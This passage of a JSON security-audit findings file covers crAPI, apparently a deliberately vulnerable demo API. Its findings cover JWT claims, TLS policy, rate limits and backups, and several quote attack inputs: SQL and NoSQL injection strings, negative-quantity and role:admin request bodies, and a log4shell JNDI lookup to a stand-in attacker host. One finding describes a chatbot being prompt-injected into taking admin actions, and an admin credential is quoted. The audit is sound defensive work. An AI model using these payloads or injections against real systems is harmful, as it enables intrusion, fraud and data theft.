      "detail": "The identity service mints RS256-signed JWTs with a 7-day TTL and no\ndocumented claim-minimization policy. Spring Security's default\n`JwtUserDetails` serialization typically embeds the user's email,\nname, role, and authorities. Without claim allowlisting, the token\ncarries PII for its full lifetime to every service in the path —\nevery downstream verifier, every log aggregator, every proxy.\n\nThe default lifetime amplification matters: at 7 days a single\nlogged JWT is a 7-day disclosure window for whatever PII the claims\nhold. The API security rubric explicitly calls out JWT-claim\namplification: \"a 1-hour bearer token carrying email, full name, and\nDOB exposes that PII to every downstream service\".\n\nThis finding is medium because the disclosure surface is bounded\nto log/proxy/downstream-service consumers — not direct public\ndisclosure. It escalates to high if the token is observed leaking\nto a SaaS log aggregator or external proxy (not currently in\nevidence).\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§4 Authentication and sessions",
          "excerpt": "Expiration defaults to JWT_EXPIRATION=604800000 milliseconds (7 days)"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Reduce JWT TTL to 1 hour and limit claims to {sub, iss, aud, exp, jti, scope}."
      },
      "mappings": {
        "nist": [
          "SC-8",
          "AC-4",
          "SC-28",
          "AU-3"
        ],
        "attack": [],
        "cwe": [
          "CWE-200",
          "CWE-532"
        ],
        "owasp_api": [
          "API3:2023",
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "conf-5f25ca4e",
      "title": "TLS configuration policy unspecified when TLS_ENABLED=true",
      "goal": "confidentiality",
      "tier": "trustworthiness",
      "severity": "medium",
      "confidence": "medium",
      "disposition": "blocked",
      "summary": "Version floor, cipher suite, certificate validation, mTLS topology unspecified.",
      "detail": "The tech plan notes `TLS_ENABLED=true` switches services to \"HTTPS-\nbacked mode using PKCS12 keystores shipped under each service's\ncerts/ directory\" but does not specify (a) the TLS version floor,\n(b) the cipher suite allowlist, (c) certificate-validation behavior\non outbound connections (identity → gateway-service, chatbot → LLM\nprovider), (d) whether mTLS is in scope at any boundary.\n\nThe shipped certs are self-signed and development-only; production\ndeploys would need real CA-issued certs but the procedure is not\ndocumented (cross-references the rotation gap in runbook §5).\n\nThis is `blocked` rather than `gap` because the project's intent is\nthat operators configure TLS at deploy time; the architectural\ndecision (TLS available, configurable) is reasonable. The\nremediation prerequisite is a declared TLS policy.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§2 Deployment topologies",
          "excerpt": "TLS_ENABLED=true to switch services into HTTPS-backed mode"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Add TLS policy section to tech_plan.md naming version floor, cipher allowlist, certificate-validation."
      },
      "mappings": {
        "nist": [
          "SC-8",
          "SC-8(1)",
          "SC-12",
          "SC-23",
          "IA-3"
        ],
        "attack": [],
        "cwe": [
          "CWE-326",
          "CWE-319"
        ],
        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "TLS policy: version floor, cipher suite allowlist, certificate-validation on outbound",
        "mTLS posture at in-cluster service-to-service hop"
      ]
    },
    {
      "id": "intg-e7ebcc95",
      "title": "Mass assignment on /workshop/api/shop/orders accepts negative quantity → arbitrary credit inflation",
      "goal": "integrity",
      "tier": "trustworthiness",
      "severity": "critical",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Server multiplies unit_price × quantity unconditionally; quantity:-100 inflates balance by 100×price.",
      "detail": "The order-create handler in workshop deserializes the entire request\nbody to the order domain object and computes `total = unit_price *\nquantity` with no positive-integer constraint on `quantity`. A caller\nsubmits `{\"product_id\": X, \"quantity\": -100}` and the signed delta is\napplied to `credit.balance`, minting balance equal to 100 × the\nproduct's unit price.\n\nThe architectural concern is twofold: (a) input validation does not\nenforce the documented invariant INV-INPUT-001 (`quantity >= 1`), and\n(b) the deserialization is allowlist-free — the handler binds every\nfield present in the JSON body onto the model, which is the broader\nOWASP API3:2023 (BOPLA write-side) pattern.\n\nSeverity is critical per the API security rubric's mass-assignment\nclause \"BOPLA — excessive property exposure or mass-assignment\nwrite-side exposure\" — the rubric specifically calls out writeable\n`account_balance`, `order_status`, and `coupon_amount` as critical;\nwriteable balance via negative-quantity is the same outcome at\nidentical impact.\n\nThe Confidentiality team's BOPLA-read finding (conf-c237e01d) and\nthis finding are the two sides of the same architectural choice\n(no serializer/deserializer allowlist); the synthesizer will likely\nlink them.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§9 Mass Assignment #8/#9",
          "excerpt": "POST /workshop/api/shop/orders allows negative quantity. The server applies the credit delta unconditionally, letting the caller mint balance"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Enforce quantity ≥ 1 server-side; replace ORM-bind with explicit allowlist serializer; compute unit_price server-side."
      },
      "mappings": {
        "nist": [
          "SI-10",
          "SI-10(5)",
          "AC-3",
          "SI-15",
          "CM-5"
        ],
        "attack": [
          "T1190"
        ],
        "cwe": [
          "CWE-915",
          "CWE-20",
          "CWE-840"
        ],
        "owasp_api": [
          "API3:2023",
          "API6:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [],
      "headline": true,
      "headline_rank": 3
    },
    {
      "id": "intg-6d98c520",
      "title": "Server-derived unit_price not confirmed on order-create path",
      "goal": "integrity",
      "tier": "trustworthiness",
      "severity": "high",
      "confidence": "medium",
      "disposition": "uncertainty",
      "summary": "Inputs do not confirm whether unit_price is server-derived from product record or accepted from request body.",
      "detail": "The threat-model T-4 entry flags this as an unconfirmed risk: \"If\nunit_price or total is passed in the request body and stored\nverbatim, the attacker pays an arbitrary amount.\" The challenge\ncatalog frames challenge 9 as enabling balance manipulation; the\nmechanism is documented as negative quantity but the related\nunit_price concern is not explicitly resolved in inputs.\n\nDisposition is `uncertainty` rather than `gap` because the OpenAPI\nextract shipped in inputs does not include the request schema for\nPOST /shop/orders. A determination requires source review.\n\nSeverity is high per the rubric's BOPLA clause if the field is\nclient-controlled; medium if server-derived. The high framing\nreflects the \"expected worst case\" under unresolved uncertainty.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "threat-model.md",
          "locator": "§2 T-4",
          "excerpt": "If unit_price or total is passed in the request body and stored verbatim, the attacker pays an arbitrary amount"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Confirm unit_price is server-derived; if not, fix per intg-e7ebcc95."
      },
      "mappings": {
        "nist": [
          "SI-10",
          "AC-3",
          "SI-15"
        ],
        "attack": [],
        "cwe": [
          "CWE-915",
          "CWE-840"
        ],
        "owasp_api": [
          "API3:2023",
          "API6:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "POST /shop/orders request-body schema",
        "OrderCreateView source for unit_price assignment"
      ]
    },
    {
      "id": "intg-b7417f91",
      "title": "NoSQL injection on /community/api/v2/coupon/validate-coupon",
      "goal": "integrity",
      "tier": "trustworthiness",
      "severity": "critical",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Request body is parsed directly into a Mongo query selector; arbitrary document read across shared-credential collections.",
      "detail": "The community service's `validate-coupon` handler in Go parses the\nJSON request body and passes the resulting structure into a Mongo\nFind selector with no sanitization. An attacker submits\n`{\"coupon_code\": {\"$ne\": \"\"}}` and the selector matches every coupon\ndocument; submitting `{\"coupon_code\": {\"$regex\": \".*\"}}` is\nequivalent.\n\nThe architectural issue is the absence of a typed request schema. A\nproperly typed handler would unmarshal into a struct with\n`CouponCode string` and pass `bson.M{\"coupon_code\": req.CouponCode}`\n— the injection surface vanishes. The current handler accepts the\nraw map.\n\nSeverity is critical per \"SQL or NoSQL injection on a PII-bearing\nendpoint\" in the API security rubric. The coupons collection here\ndoes not directly carry PII, but the same injection pattern on the\ncoupon_documents collection enables arbitrary document read which\nreaches into the broader mongo schema (posts collection, chatbot\nhistory collection — both PII-bearing) under the shared admin\ncredential (conf-3e324699).\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§9 NoSQL Injection #12",
          "excerpt": "/community/api/v2/coupon/validate-coupon endpoint parses the request body directly into a Mongo query selector"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Unmarshal into typed struct; never pass user input as Mongo selector."
      },
      "mappings": {
        "nist": [
          "SI-10",
          "SI-10(5)",
          "AC-3",
          "AC-6"
        ],
        "attack": [
          "T1190"
        ],
        "cwe": [
          "CWE-943",
          "CWE-89",
          "CWE-20"
        ],
        "owasp_api": [
          "API10:2023",
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [],
      "headline": true,
      "headline_rank": 4
    },
    {
      "id": "intg-2aeb03f1",
      "title": "SQL injection on /workshop/api/shop/apply_coupon (string-concat UPDATE)",
      "goal": "integrity",
      "tier": "trustworthiness",
      "severity": "critical",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Coupon code concatenated into SQL UPDATE; UPDATE injection re-arms claimed flags; UNION reads PII tables under shared admin.",
      "detail": "The workshop service's `apply_coupon` handler constructs the\nclaim-state UPDATE statement via string concatenation with the\ncaller-supplied `coupon_code`. An attacker supplies a code containing\n`'); UPDATE coupons SET claimed_by=NULL WHERE 1=1 -- ` (or similar)\nand the UPDATE clears the claimed_by field across the table, making\nevery coupon re-redeemable.\n\nThis is the standard SQL-injection pattern: user input concatenated\ninto a SQL fragment with no parameterization. Django ORM provides\nparameterized queries by default; the affected handler is presumably\nusing `raw()` or `cursor.execute()` with format-string substitution.\n\nSeverity is critical per \"SQL or NoSQL injection on a PII-bearing\nendpoint\" in the API security rubric. The coupons table itself does\nnot carry PII, but the same SQL connection has full access to the\nusers, vehicles, orders, and credit tables under the shared admin\ncredential (conf-3e324699). Direct UNION SELECT against the\ncoupons-table query yields users.email/password/role records.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§9 SQL Injection #13",
          "excerpt": "workshop apply_coupon flow concatenates SQL; UPDATE statements can be injected to clear claimed flags"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Replace string-concat SQL with parameterized queries; audit every workshop handler."
      },
      "mappings": {
        "nist": [
          "SI-10",
          "SI-10(5)",
          "AC-3",
          "AC-6",
          "CM-5"
        ],
        "attack": [
          "T1190"
        ],
        "cwe": [
          "CWE-89",
          "CWE-20"
        ],
        "owasp_api": [
          "API10:2023",
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [],
      "headline": true,
      "headline_rank": 5
    },
    {
      "id": "intg-62ebf664",
      "title": "Mass assignment on /identity/api/v2/user/videos/{video_id} accepts internal fields",
      "goal": "integrity",
      "tier": "trustworthiness",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Shadow video-update endpoint persists arbitrary request body fields including the conversion_params field leaked by EDE #5.",
      "detail": "Linked to conf-c237e01d (read-side leak of same field).",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§9 Mass Assignment #10",
          "excerpt": "shadow update endpoint accepts arbitrary internal video fields, reachable by leveraging the leaked field name from #5"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Add allowlist serializer on video-update; strip conversion_params from writeable set."
      },
      "mappings": {
        "nist": [
          "SI-10",
          "AC-3",
          "SI-15"
        ],
        "attack": [
          "T1190"
        ],
        "cwe": [
          "CWE-915",
          "CWE-20"
        ],
        "owasp_api": [
          "API3:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "intg-a6b6d147",
      "title": "Mass-assignment on user-update may expose role field (E-3)",
      "goal": "integrity",
      "tier": "trustworthiness",
      "severity": "high",
      "confidence": "medium",
      "disposition": "gap",
      "summary": "Possible mass-assignment to users.role on self-update endpoint; not confirmed in OpenAPI but consistent with pattern.",
      "detail": "Threat-model entry E-3 surfaces the concern that a self-update\nendpoint may bind a `role` field client-supplied. If the role enum\nincludes `admin` and the handler binds it, an attacker submits\n`{\"name\": \"...\", \"role\": \"admin\"}` on a benign-looking profile\nupdate and self-elevates.\n\nThe OpenAPI extract in inputs does not include a `/user/update`\nendpoint, but the same allowlist-free deserialization pattern that\nenables intg-e7ebcc95, intg-62ebf664, and intg-b7417f91 makes E-3\nstructurally plausible. The intake brief flags this as an evidence\ngap.\n\nSeverity is high per the BOPLA write-side clause specifically\nbecause privilege-relevant fields are at issue (\"writeable\nis_admin\", \"writeable role\" per the rubric); confidence is medium\npending source confirmation of the writeable surface.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "threat-model.md",
          "locator": "§6 E-3",
          "excerpt": "Caller submits {role: admin} alongside benign fields on a self-update; the field is bound to the user record"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Add allowlist DTO that excludes role on any user-update endpoint."
      },
      "mappings": {
        "nist": [
          "SI-10",
          "AC-3",
          "AC-6"
        ],
        "attack": [
          "T1078"
        ],
        "cwe": [
          "CWE-915",
          "CWE-269"
        ],
        "owasp_api": [
          "API3:2023",
          "API5:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "Identity user-update endpoint definition and request schema",
        "Spring binding-allowlist or @JsonIgnoreProperties on User entity"
      ]
    },
    {
      "id": "intg-ab3edc7a",
      "title": "Coupon redemption is not idempotent — SQL injection re-arms claimed flag",
      "goal": "integrity",
      "tier": "trustworthiness",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "INV-INPUT-003 asserts idempotency; SQL injection on apply_coupon defeats the claimed-state check.",
      "detail": "Linked to intg-2aeb03f1.",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "invariants.md",
          "locator": "INV-INPUT-003",
          "excerpt": "Challenge 13 contradicts via SQL injection on the claimed-state UPDATE"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Fix underlying SQL injection (intg-2aeb03f1); add UNIQUE (coupon_code, claimed_by) constraint."
      },
      "mappings": {
        "nist": [
          "SI-10",
          "SI-7",
          "SC-5",
          "AU-12"
        ],
        "attack": [],
        "cwe": [
          "CWE-89",
          "CWE-840"
        ],
        "owasp_api": [
          "API6:2023",
          "API10:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "merged-d2e871f5",
      "title": "Chatbot prompt-injection drives admin actions; embedded credential breaks attribution",
      "goal": "integrity",
      "tier": "trustworthiness",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Merged: (a) chatbot holds admin credential, (b) prompt-injection induces tool calls under admin authority, (c) downstream audit attributes to admin not prompt author.",
      "detail": "Merged from intg-078ee9f6 (Integrity write-path), auth-55e76c4d\n(Authenticity credential-binding), nonrep-fc423071 (Non-\nRepudiation attribution), ephem-b95a7d11 (Ephemeral rotation).\nFour-lens merge; single fix.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "architecture-index.md",
          "locator": "§crapi-chatbot Role",
          "excerpt": "API_USER=admin@example.com / API_PASSWORD=Admin!123 — a privileged crAPI credential used to act on behalf of users"
        },
        {
          "artifact": "tech_plan.md",
          "locator": "§9 LLM #16/17/18",
          "excerpt": "Chatbot prompt-injection allowing client-side rendering injection (#16), credential extraction (#17), action-on-behalf-of (#18)"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Remove embedded credential; chatbot acts under prompt author's bearer; tool-call allowlist per user role; audit every chat-driven call."
      },
      "mappings": {
        "nist": [
          "SI-10",
          "AC-3",
          "AC-6",
          "AC-6(1)",
          "AC-6(5)",
          "IA-9",
          "IA-2",
          "AU-3",
          "AU-3(1)",
          "AU-10",
          "IA-5"
        ],
        "attack": [
          "T1078",
          "T1552"
        ],
        "cwe": [
          "CWE-77",
          "CWE-285",
          "CWE-269",
          "CWE-94",
          "CWE-798",
          "CWE-223"
        ],
        "owasp_api": [
          "API5:2023",
          "API8:2023",
          "API2:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [
        null,
        null,
        null,
        null
      ],
      "prerequisite_evidence": [],
      "headline": true,
      "headline_rank": 6
    },
    {
      "id": "intg-8d97cd9f",
      "title": "ENABLE_LOG4J and ENABLE_SHELL_INJECTION feature flags wire deliberate injection sinks",
      "goal": "integrity",
      "tier": "trustworthiness",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Default-false env flags activate log4shell-style and command-injection sinks when flipped; no operator signal on activation.",
      "detail": "Identity ships with two feature flags that, when enabled, wire\nclassic injection sinks into the live code path:\n\n- `ENABLE_LOG4J=true` enables a log4shell-style sink — likely a\n  user-input field logged via a vulnerable log4j path so that\n  `${jndi:ldap://attacker/x}` triggers RCE.\n- `ENABLE_SHELL_INJECTION=true` enables a command-injection sink —\n  likely a video-conversion shell-out parameterized with caller-\n  controlled input.\n\nThe default values are `false`, but the flags exist as deployable\nenv. Per the input-trust boundary and the documented evidence, the\nflags are part of the artifact — operators may flip them\naccidentally or for testing.\n\nThe Integrity framing is the flags themselves: a system whose\nruntime behavior is gated on an env var that flips a critical\ninput-validation control is a configuration-integrity concern.\nSeverity is medium because the default-off state is the deployed\nstate in any unattended deploy; this would be critical if the\ndefaults were `true`.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§9 Implicit posture facts",
          "excerpt": "ENABLE_LOG4J=false flag exists. ENABLE_SHELL_INJECTION=false flag exists in the identity env"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Remove injection-sink flags entirely; replace with explicit demo-mode versioning with startup banner."
      },
      "mappings": {
        "nist": [
          "CM-7",
          "CM-7(5)",
          "SI-10",
          "SI-7",
          "CM-3"
        ],
        "attack": [],
        "cwe": [
          "CWE-94",
          "CWE-78",
          "CWE-117"
        ],
        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "intg-b097f9a8",
      "title": "Cross-store consistency between coupons (Postgres) and coupon_documents (Mongo) is application-mediated",
      "goal": "integrity",
      "tier": "trustworthiness",
      "severity": "medium",
      "confidence": "medium",
      "disposition": "blocked",
      "summary": "No coordination protocol; partial-failure behavior unspecified.",
      "detail": "Per ADR-0004, the coupon flow touches Postgres (`coupons.claimed_by`)\nand Mongo (`coupon_documents` metadata) without a coordination\nprotocol. The ADR explicitly notes \"cross-store consistency is the\napplication's responsibility\" and frames it as an intentional\nteaching pattern.\n\nThe Integrity concern: under partial failure (Postgres commits,\nMongo write fails) the two stores diverge. There is no compensating-\naction protocol, no saga pattern, no two-phase commit. The\nchallenge-13 SQL injection further weaponizes the divergence by\nre-arming the claimed flag in Postgres while leaving Mongo intact.\n\nThis is `blocked` because the deployed coordination posture (or\nabsence) is not specified in the inputs and the ADR is explicit\nthat the absence is intentional. Severity is medium because the\nfinancial impact is bounded to coupon-redemption disputes; it\nescalates if cross-store divergence affects orders or credit\nrecords.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "adrs/0004-dual-datastore-postgres-and-mongo.md",
          "locator": "Consequences",
          "excerpt": "Cross-store consistency is the application's responsibility"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Document the coupon-flow saga; add reconciliation runbook and periodic divergence check."
      },
      "mappings": {
        "nist": [
          "SI-7",
          "SI-10",
          "CP-12"
        ],
        "attack": [],
        "cwe": [
          "CWE-362",
          "CWE-840"
        ],
        "owasp_api": [
          "API6:2023",
          "API10:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "Cross-store coupon-flow source",
        "Reconciliation script or runbook"
      ]
    },
    {
      "id": "avail-e96ad7ff",
      "title": "No rate limit on /identity/api/auth/v3/check-otp (4-digit space, 10k entries)",
      "goal": "availability",
      "tier": "trustworthiness",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Unbounded guess attempts against trivial OTP space; brute force completes in seconds.",
      "detail": "The v3 OTP-check variant lacks the rate limit applied to v2 (per\nchallenge 3 solution discussion). At a 10,000-entry OTP space and\nno per-account / per-IP throttle, an attacker exhausts the keyspace\nin seconds, achieving account takeover for any user whose email is\nenumerable (which is every user, per community-post author display).\n\nBeyond the authentication-bypass severity (owned by Authenticity),\nthis is also an Availability concern: the brute-force request\nvolume is itself a probe-storm DoS against identity, and the OTP\nissuance side (forget-password) has no rate limit either — a\ncoordinated attacker can drive OTP issuance and brute force in\nparallel, saturating identity's CPU budget under the compose\n`cpus: 0.8` cap.\n\nSeverity is high per the \"Rate-limiting absent on authentication\n[...] account-recovery endpoints\" clause, escalated by the\ncompose-cap amplifier per the rubric's compose-and-amplify guidance.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§4 Authentication, /v3/check-otp",
          "excerpt": "rate-limiting on v2 was added but v3 and other variants remain bypassable"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Apply identical rate-limit + lockout to every check-otp variant; centralize OTP-verification logic; increase OTP entropy to 6+ digits."
      },
      "mappings": {
        "nist": [
          "SC-5",
          "SC-5(1)",
          "AC-7",
          "AC-7(2)",
          "IA-5"
        ],
        "attack": [
          "T1110"
        ],
        "cwe": [
          "CWE-307",
          "CWE-770"
        ],
        "owasp_api": [
          "API4:2023",
          "API2:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "avail-c1ffcf8e",
      "title": "No rate limit on /identity/api/auth/forget-password",
      "goal": "availability",
      "tier": "trustworthiness",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Unbounded OTP-issuance saturates mailhog ring buffer and resets active OTP.",
      "detail": "The `forget-password` endpoint emits a fresh OTP to mailhog on every\ncall. There is no per-account or per-IP rate limit (the catalog\nnotes rate-limit on `v2/check-otp` only). An attacker dials the\nendpoint at high rate against a victim account, generating one\nmailhog email per request, and each issuance resets the active OTP.\nPer ADR-0003 \"No replay or throttling discipline on OTP issuance\"\nis explicit.\n\nTwo Availability concerns: (a) high-rate OTP issuance is a\nprobe-storm DoS against identity and a write-burst on the OTP\nstorage subsystem; (b) the per-request mailhog dispatch saturates\nthe SMTP catcher's in-memory ring buffer, evicting earlier\nmessages and potentially losing legitimate emails for other users.\n\nThe authentication-impact (account-recovery weakening) is owned by\nAuthenticity (authn-otp-rate-limit). This finding holds the\navailability-impact lens.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "adrs/0003-mailhog-for-otp-delivery.md",
          "locator": "Consequences",
          "excerpt": "No replay or throttling discipline on OTP issuance"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Cap OTP issuance to 3 per account per hour; per-IP cap 20/hour."
      },
      "mappings": {
        "nist": [
          "SC-5",
          "AC-7",
          "IA-5"
        ],
        "attack": [],
        "cwe": [
          "CWE-307",
          "CWE-770"
        ],
        "owasp_api": [
          "API4:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "avail-fb795bfb",
      "title": "No timeout on outbound calls — identity→gateway, workshop→mechanic, chatbot→LLM",
      "goal": "availability",
      "tier": "trustworthiness",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Outbound HTTP timeout discipline undocumented; vendor slowdown pins thread pools.",
      "detail": "Two outbound paths are documented in artifacts:\n\n- identity → `api.mypremiumdealership.com` (VIN owner lookup,\n  payment dispatch). Outbound HTTPS basic-auth. Timeout posture\n  not specified.\n- workshop → user-supplied `mechanic_api` URL (the SSRF surface).\n  Timeout posture not specified.\n\nWithout an outbound timeout, a slow upstream pins the calling\nservice's worker thread indefinitely. Per the compose `cpus: 0.8,\nmemory: 384M` constraints, modest thread-pool exhaustion (a few\ndozen pinned threads) is enough to saturate identity or workshop.\n\nSeverity is medium per the rubric's \"No timeout on outbound calls\nto third-party APIs\" clause; the impact is bounded by upstream\nstability today but is the structural amplifier for any vendor\nincident. Combined with avail-6af5aff7 (no rate limit on the\ncaller), severity escalates because the attacker can manufacture\nthe slow-upstream condition.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§3 boundary #5",
          "excerpt": "identity → gateway-service. Outbound HTTPS to https://api.mypremiumdealership.com"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Establish outbound timeout policy: 5s connect, 10s total per call."
      },
      "mappings": {
        "nist": [
          "SC-5",
          "SI-13",
          "CP-13"
        ],
        "attack": [],
        "cwe": [
          "CWE-400",
          "CWE-1088"
        ],
        "owasp_api": [
          "API4:2023",
          "API10:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "avail-470902f0",
      "title": "No SLO/SLI declared for any service or surface",
      "goal": "availability",
      "tier": "trustworthiness",
      "severity": "medium",
      "confidence": "high",
      "disposition": "blocked",
      "summary": "agents.md explicitly states no SLO commitment; no error budget, no burn-rate alerting.",
      "detail": "Per `agents.md`, crAPI is operated by a single security-engineering\npractitioner or a workshop instructor; there is no enterprise\noperator and explicitly no SLO commitment to anyone using the\ndeployed instance. The intent is \"deploy-and-explore\", not\n\"administer-and-defend\".\n\nThe Availability finding here is not that an SLO is missing in\nisolation — it is that the absence of any SLO statement makes the\ngauntlet unable to evaluate other Availability findings against a\ntarget. The rubric's \"SLO and error budget undeclared for\nconsequential paths\" clause applies, but the architectural choice\n(no SLO is correct for the demo's intent) is explicit in inputs.\n\nDisposition is `blocked` because evaluating Availability findings\nagainst a missing baseline is not meaningful; the prerequisite is\na declared availability target, which by the agents.md framing\ndoes not apply for the demo's intent.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "agents.md",
          "locator": "§Who operates crAPI",
          "excerpt": "There is no enterprise operator. There is no on-call rotation. There is no SLO commitment"
        }
      ],
      "recommendation": {
        "posture": "consider",
        "summary": "If non-demo deploy contemplated, declare 99% SLO on auth path."
      },
      "mappings": {
        "nist": [
          "CP-2",
          "CP-2(3)",
          "SI-13"
        ],
        "attack": [],
        "cwe": [],
        "owasp_api": [
          "API4:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "Declared availability target for any production-intent deploy"
      ]
    },
    {
      "id": "avail-898bfad0",
      "title": "Health checks are shallow — port-availability, not dependency-aware",
      "goal": "availability",
      "tier": "trustworthiness",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "/health_check endpoints probe local readiness only; chatbot has no documented external health endpoint.",
      "detail": "The runbook §2 lists per-service health endpoints as basic GET\nchecks (`/identity/health_check`, `/workshop/health_check/`,\n`/community/home`). The check shape per docker-compose `healthcheck:`\nblocks invokes `health.sh` which (by convention for Spring Boot /\nDjango / Go) typically checks process liveness — not whether the\nservice can actually serve requests end-to-end (e.g., reach\nPostgres, fetch the JWKS, route to mailhog).\n\nThe chatbot service has no documented external health endpoint per\nrunbook §2. Shallow health checks mask dependency degradation: the\nload balancer continues to send traffic to instances that can\naccept connections but cannot complete authenticated requests\nbecause, e.g., identity is unreachable.\n\nSeverity is high per the rubric's \"Health checks specified as TCP\nport checks or basic HTTP-200 checks only\" — the operative concern\nis that the health-check shape does not inform any failover or\ndegradation decision because no such decision exists in the\ndeploy.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "runbook.md",
          "locator": "§2 Health checks",
          "excerpt": "Each service ships a health.sh invoked by the compose healthcheck: block"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Add dependency-aware /readyz endpoints; document expected shape."
      },
      "mappings": {
        "nist": [
          "SI-13",
          "CP-10",
          "SC-5"
        ],
        "attack": [],
        "cwe": [
          "CWE-754",
          "CWE-1088"
        ],
        "owasp_api": [
          "API4:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "avail-8ad04f0e",
      "title": "No backup or restore procedure documented",
      "goal": "availability",
      "tier": "trustworthiness",
      "severity": "medium",
      "confidence": "high",
      "disposition": "blocked",
      "summary": "Runbook §10 explicitly states no backup/restore tooling; PITR, RPO/RTO unspecified.",
      "detail": "crAPI does not ship a backup procedure for Postgres, Mongo, or\nChromaDB. Per tech_plan §6 and runbook §10, the operator can wipe\nnamed volumes with `docker compose down -v` but there is no\nforward-recovery path from a corrupted state.\n\nThe Availability concern is not the absence of backups in\nisolation — for the demo intent that is appropriate — but the\nabsence of any documented restore-time bound, RPO/RTO target, or\nransomware-resilience posture. Per the rubric this is a defense-\nin-depth gap; severity is medium because the deploy intent\n(single-host demo) bounds the impact.\n\nDisposition is `blocked` because remediation depends on deploy\ntarget: a single-host demo has different backup needs from a\nclassroom-shared host from a contemplated production deploy. The\nprerequisite is a stated deploy intent and recovery target.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§6 Persistence and storage",
          "excerpt": "Backups: unspecified. No backup, restore, or PITR procedure ships"
        }
      ],
      "recommendation": {
        "posture": "consider",
        "summary": "For non-demo deploys, add coordinated Postgres+Mongo backup with stated RPO/RTO."
      },
      "mappings": {
        "nist": [
          "CP-9",
          "CP-9(1)",
          "CP-9(8)",
          "CP-10",
          "CP-10(2)"
        ],
        "attack": [],
        "cwe": [
          "CWE-1188"
        ],
